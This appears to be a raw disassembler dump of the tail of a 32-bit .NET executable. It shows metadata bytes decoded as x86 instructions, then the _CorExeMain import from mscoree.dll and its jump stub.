  40c215:	02 12                	add    (%edx),%dl
  40c217:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c21a:	02 08                	add    (%eax),%cl
  40c21c:	08 05 20 01 08 12    	or     %al,0x12080120
  40c222:	25 06 00 02 08       	and    $0x8020006,%eax
  40c227:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c22c:	03 08                	add    (%eax),%ecx
  40c22e:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c233:	20 01                	and    %al,(%ecx)
  40c235:	01 12                	add    %edx,(%edx)
  40c237:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c23d:	1c 0c                	sbb    $0xc,%al
  40c23f:	07                   	pop    %es
  40c240:	06                   	push   %es
  40c241:	1c 02                	sbb    $0x2,%al
  40c243:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c248:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c24e:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c251:	02 07                	add    (%edi),%al
  40c253:	20 02                	and    %al,(%edx)
  40c255:	02 08                	add    (%eax),%cl
  40c257:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c25d:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c263:	07                   	pop    %es
  40c264:	0a 12                	or     (%edx),%dl
  40c266:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c26d:	08 12 81 
  40c270:	41                   	inc    %ecx
  40c271:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c277:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c27c:	4d                   	dec    %ebp
  40c27d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c282:	0e                   	push   %cs
  40c283:	05 00 00 12 81       	add    $0x81120000,%eax
  40c288:	41                   	inc    %ecx
  40c289:	05 20 00 12 81       	add    $0x81120020,%eax
  40c28e:	55                   	push   %ebp
  40c28f:	06                   	push   %es
  40c290:	00 00                	add    %al,(%eax)
  40c292:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c297:	00 01                	add    %al,(%ecx)
  40c299:	0e                   	push   %cs
  40c29a:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c29f:	01 11                	add    %edx,(%ecx)
  40c2a1:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c2a8:	41                   	inc    %ecx
  40c2a9:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c2af:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c2b6:	49                   	dec    %ecx
  40c2b7:	0e                   	push   %cs
  40c2b8:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c2be:	0e                   	push   %cs
  40c2bf:	0e                   	push   %cs
  40c2c0:	0e                   	push   %cs
  40c2c1:	0e                   	push   %cs
  40c2c2:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c2c7:	1c 07                	sbb    $0x7,%al
  40c2c9:	20 02                	and    %al,(%edx)
  40c2cb:	01 0e                	add    %ecx,(%esi)
  40c2cd:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c2d3:	0a 02                	or     (%edx),%al
  40c2d5:	10 07                	adc    %al,(%edi)
  40c2d7:	06                   	push   %es
  40c2d8:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c2de:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c2e4:	0e                   	push   %cs
  40c2e5:	02 05 20 00 12 81    	add    0x81120020,%al
  40c2eb:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c2f1:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c2f7:	91                   	xchg   %eax,%ecx
  40c2f8:	04 20                	add    $0x20,%al
  40c2fa:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c2fd:	04 07                	add    $0x7,%al
  40c2ff:	02 02                	add    (%edx),%al
  40c301:	02 03                	add    (%ebx),%al
  40c303:	20 00                	and    %al,(%eax)
  40c305:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c308:	02 18                	add    (%eax),%bl
  40c30a:	02 03                	add    (%ebx),%al
  40c30c:	07                   	pop    %es
  40c30d:	01 0e                	add    %ecx,(%esi)
  40c30f:	05 00 00 12 81       	add    $0x81120000,%eax
  40c314:	9d                   	popf
  40c315:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c31a:	1c 0a                	sbb    $0xa,%al
  40c31c:	07                   	pop    %es
  40c31d:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c322:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c327:	20 01                	and    %al,(%ecx)
  40c329:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c32f:	0e                   	push   %cs
  40c330:	08 08                	or     %cl,(%eax)
  40c332:	06                   	push   %es
  40c333:	07                   	pop    %es
  40c334:	02 02                	add    (%edx),%al
  40c336:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c33c:	0e                   	push   %cs
  40c33d:	0e                   	push   %cs
  40c33e:	0e                   	push   %cs
  40c33f:	05 20 00 11 81       	add    $0x81110020,%eax
  40c344:	ad                   	lods   %ds:(%esi),%eax
  40c345:	05 00 00 12 81       	add    $0x81120000,%eax
  40c34a:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c34f:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c355:	02 11                	add    (%ecx),%dl
  40c357:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c35d:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c364:	12 81 8d 
  40c367:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c36d:	12 41 01             	adc    0x1(%ecx),%al
  40c370:	0e                   	push   %cs
  40c371:	05 20 01 01 13       	add    $0x13010120,%eax
  40c376:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c37c:	00 06                	add    %al,(%esi)
  40c37e:	00 02                	add    %al,(%edx)
  40c380:	0e                   	push   %cs
  40c381:	0e                   	push   %cs
  40c382:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c387:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c38c:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c392:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c398:	c5 09                	lds    (%ecx),%ecx
  40c39a:	00 02                	add    %al,(%edx)
  40c39c:	02 11                	add    (%ecx),%dl
  40c39e:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c3a4:	07                   	pop    %es
  40c3a5:	02 12                	add    (%edx),%dl
  40c3a7:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c3ac:	01 02                	add    %eax,(%edx)
  40c3ae:	0e                   	push   %cs
  40c3af:	10 02                	adc    %al,(%edx)
  40c3b1:	06                   	push   %es
  40c3b2:	00 01                	add    %al,(%ecx)
  40c3b4:	01 12                	add    %edx,(%edx)
  40c3b6:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c3bc:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c3c3:	0e                   	push   %cs
  40c3c4:	1c 11                	sbb    $0x11,%al
  40c3c6:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c3cc:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c3d3:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c3d9:	05 07 20 02 12       	add    $0x12022007,%eax
  40c3de:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c3e5:	12 60 0e             	adc    0xe(%eax),%ah
  40c3e8:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c3ed:	12 60 12             	adc    0x12(%eax),%ah
  40c3f0:	60                   	pusha
  40c3f1:	06                   	push   %es
  40c3f2:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c3f7:	60                   	pusha
  40c3f8:	10 10                	adc    %dl,(%eax)
  40c3fa:	01 01                	add    %eax,(%ecx)
  40c3fc:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c401:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c407:	1e                   	push   %ds
  40c408:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c40b:	01 12                	add    %edx,(%edx)
  40c40d:	60                   	pusha
  40c40e:	09 20                	or     %esp,(%eax)
  40c410:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c416:	13 00                	adc    (%eax),%eax
  40c418:	07                   	pop    %es
  40c419:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c41e:	12 60 04             	adc    0x4(%eax),%ah
  40c421:	20 00                	and    %al,(%eax)
  40c423:	13 00                	adc    (%eax),%eax
  40c425:	05 20 01 02 13       	add    $0x13020120,%eax
  40c42a:	00 03                	add    %al,(%ebx)
  40c42c:	07                   	pop    %es
  40c42d:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c434:	e5 07                	in     $0x7,%eax
  40c436:	20 01                	and    %al,(%ecx)
  40c438:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c43e:	20 01                	and    %al,(%ecx)
  40c440:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c446:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c449:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c44f:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c455:	00 02                	add    %al,(%edx)
  40c457:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c45d:	0e                   	push   %cs
  40c45e:	1c 00                	sbb    $0x0,%al
  40c460:	05 12 82 05 11       	add    $0x11058212,%eax
  40c465:	82 09 0e             	orb    $0xe,(%ecx)
  40c468:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c46d:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c473:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c478:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c47e:	45                   	inc    %ebp
  40c47f:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c485:	4d                   	dec    %ebp
  40c486:	1c 12                	sbb    $0x12,%al
  40c488:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c48d:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c492:	0e                   	push   %cs
  40c493:	0b 00                	or     (%eax),%eax
  40c495:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c49b:	00 12                	add    %dl,(%edx)
  40c49d:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c4a4:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c4a9:	4d                   	dec    %ebp
  40c4aa:	1c 12                	sbb    $0x12,%al
  40c4ac:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4b1:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4b6:	0e                   	push   %cs
  40c4b7:	17                   	pop    %ss
  40c4b8:	20 0a                	and    %cl,(%edx)
  40c4ba:	01 13                	add    %edx,(%ebx)
  40c4bc:	00 13                	add    %dl,(%ebx)
  40c4be:	01 13                	add    %edx,(%ebx)
  40c4c0:	02 13                	add    (%ebx),%dl
  40c4c2:	03 13                	add    (%ebx),%edx
  40c4c4:	04 13                	add    $0x13,%al
  40c4c6:	05 13 06 13 07       	add    $0x7130613,%eax
  40c4cb:	13 08                	adc    (%eax),%ecx
  40c4cd:	13 09                	adc    (%ecx),%ecx
  40c4cf:	05 07 01 12 82       	add    $0x82120107,%eax
  40c4d4:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c4d9:	0e                   	push   %cs
  40c4da:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c4df:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c4e5:	06                   	push   %es
  40c4e6:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c4ec:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c4f2:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c4f7:	20 01                	and    %al,(%ecx)
  40c4f9:	01 11                	add    %edx,(%ecx)
  40c4fb:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c502:	82 31 05             	xorb   $0x5,(%ecx)
  40c505:	20 00                	and    %al,(%eax)
  40c507:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c50d:	01 12                	add    %edx,(%edx)
  40c50f:	61                   	popa
  40c510:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c516:	08 20                	or     %ah,(%eax)
  40c518:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c51e:	08 1a                	or     %bl,(%edx)
  40c520:	07                   	pop    %es
  40c521:	0a 12                	or     (%edx),%dl
  40c523:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c52a:	21 1d 05 
  40c52d:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c532:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c539:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c53e:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c544:	45                   	inc    %ebp
  40c545:	08 08                	or     %cl,(%eax)
  40c547:	04 07                	add    $0x7,%al
  40c549:	02 02                	add    (%edx),%al
  40c54b:	08 09                	or     %cl,(%ecx)
  40c54d:	00 02                	add    %al,(%edx)
  40c54f:	01 12                	add    %edx,(%edx)
  40c551:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c555:	4d                   	dec    %ebp
  40c556:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c55b:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c561:	05 08 05 07 07       	add    $0x7070508,%eax
  40c566:	02 12                	add    (%edx),%dl
  40c568:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c56c:	08 07                	or     %al,(%edi)
  40c56e:	04 12                	add    $0x12,%al
  40c570:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c575:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c57a:	1c 06                	sbb    $0x6,%al
  40c57c:	07                   	pop    %es
  40c57d:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c583:	20 01                	and    %al,(%ecx)
  40c585:	13 00                	adc    (%eax),%eax
  40c587:	08 04 07             	or     %al,(%edi,%eax,1)
  40c58a:	01 12                	add    %edx,(%edx)
  40c58c:	60                   	pusha
  40c58d:	0e                   	push   %cs
  40c58e:	07                   	pop    %es
  40c58f:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c594:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c59a:	12 60 07             	adc    0x7(%eax),%ah
  40c59d:	07                   	pop    %es
  40c59e:	04 08                	add    $0x8,%al
  40c5a0:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c5a5:	20 01                	and    %al,(%ecx)
  40c5a7:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c5ad:	64 04 00             	fs add $0x0,%al
  40c5b0:	01 0b                	add    %ecx,(%ebx)
  40c5b2:	0a 04 00             	or     (%eax,%eax,1),%al
  40c5b5:	01 0b                	add    %ecx,(%ebx)
  40c5b7:	0e                   	push   %cs
  40c5b8:	04 00                	add    $0x0,%al
  40c5ba:	01 0b                	add    %ecx,(%ebx)
  40c5bc:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c5c1:	0c 06                	or     $0x6,%al
  40c5c3:	00 01                	add    %al,(%ecx)
  40c5c5:	0b 11                	or     (%ecx),%edx
  40c5c7:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c5ce:	04 00 01 
  40c5d1:	0a 0e                	or     (%esi),%cl
  40c5d3:	04 00                	add    $0x0,%al
  40c5d5:	01 0a                	add    %ecx,(%edx)
  40c5d7:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c5dc:	0c 06                	or     $0x6,%al
  40c5de:	00 01                	add    %al,(%ecx)
  40c5e0:	0a 11                	or     (%ecx),%dl
  40c5e2:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c5e9:	04 00 01 
  40c5ec:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c5f1:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c5f5:	ad                   	lods   %ds:(%esi),%eax
  40c5f6:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c5fb:	0c 07                	or     $0x7,%al
  40c5fd:	07                   	pop    %es
  40c5fe:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c604:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c609:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c60f:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c615:	12 60 1d             	adc    0x1d(%eax),%ah
  40c618:	0e                   	push   %cs
  40c619:	0e                   	push   %cs
  40c61a:	08 12                	or     %dl,(%edx)
  40c61c:	60                   	pusha
  40c61d:	08 05 07 01 12 81    	or     %al,0x81120107
  40c623:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c628:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c62f:	05 08 08 06 00       	add    $0x60808,%eax
  40c634:	02 07                	add    (%edi),%al
  40c636:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c63b:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c642:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c648:	00 02                	add    %al,(%edx)
  40c64a:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c650:	02 0b                	add    (%ebx),%cl
  40c652:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c657:	02 06                	add    (%esi),%al
  40c659:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c65e:	02 0a                	add    (%edx),%cl
  40c660:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c665:	03 12                	add    (%edx),%edx
  40c667:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c66e:	07 02 12 
  40c671:	60                   	pusha
  40c672:	02 04 07             	add    (%edi,%eax,1),%al
  40c675:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c67b:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c680:	04 1d                	add    $0x1d,%al
  40c682:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c687:	06                   	push   %es
  40c688:	07                   	pop    %es
  40c689:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c68f:	00 01                	add    %al,(%ecx)
  40c691:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c696:	06                   	push   %es
  40c697:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c69d:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c6a3:	05 08 20 02 01       	add    $0x1022008,%eax
  40c6a8:	12 61 11             	adc    0x11(%ecx),%ah
  40c6ab:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c6af:	04 12                	add    $0x12,%al
  40c6b1:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c6b8:	1d 05 00 
  40c6bb:	00 e4                	add    %ah,%ah
  40c6bd:	c6 00 00             	movb   $0x0,(%eax)
	...
  40c6c8:	fe c6                	inc    %dh
  40c6ca:	00 00                	add    %al,(%eax)
  40c6cc:	00 20                	add    %ah,(%eax)
	...
  40c6e2:	00 00                	add    %al,(%eax)
  40c6e4:	f0 c6 00 00          	lock movb $0x0,(%eax)
	...
  40c6f0:	00 00                	add    %al,(%eax)
  40c6f2:	5f                   	pop    %edi
  40c6f3:	43                   	inc    %ebx
  40c6f4:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6f5:	72 45                	jb     0x40c73c
  40c6f7:	78 65                	js     0x40c75e
  40c6f9:	4d                   	dec    %ebp
  40c6fa:	61                   	popa
  40c6fb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c702:	72 65                	jb     0x40c769
  40c704:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c708:	6c                   	insb   (%dx),%es:(%edi)
  40c709:	00 00                	add    %al,(%eax)
  40c70b:	00 00                	add    %al,(%eax)
  40c70d:	00 ff                	add    %bh,%bh
  40c70f:	25 00 20 40 00       	and    $0x402000,%eax
